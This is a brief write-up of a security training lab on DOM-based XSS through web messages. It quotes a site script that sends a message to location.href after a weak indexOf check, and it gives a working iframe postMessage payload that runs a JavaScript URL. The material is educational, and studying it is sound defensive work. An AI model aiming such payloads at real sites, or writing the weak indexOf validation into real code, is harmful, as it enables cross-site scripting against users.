Lab: DOM XSS using web messages and a JavaScript URL


the following script is seen in the request to /

                   <script>
                        window.addEventListener('message', function(e) {
                            var url = e.data;
                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                location.href = url;
                            }
                        }, false);
                    </script>

this script takes a message and redirects the user to the url.

what the website does incorrectly in this script is validate the http: and the https: strings with the indexof() method.


i used the following payload in the exploit server:
<iframe src="https://0aea0033049efd688092c1bd005f0038.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//https:','*')">



This script sends a web message containing an arbitrary JavaScript payload, along with the string "https:". 
The second argument specifies that any targetOrigin is allowed for the web message.


When the iframe loads, the postMessage() method sends the JavaScript payload to the main page. 
The event listener spots the "http:" string and proceeds to send the payload to the location.href sink, where the print() function is called.
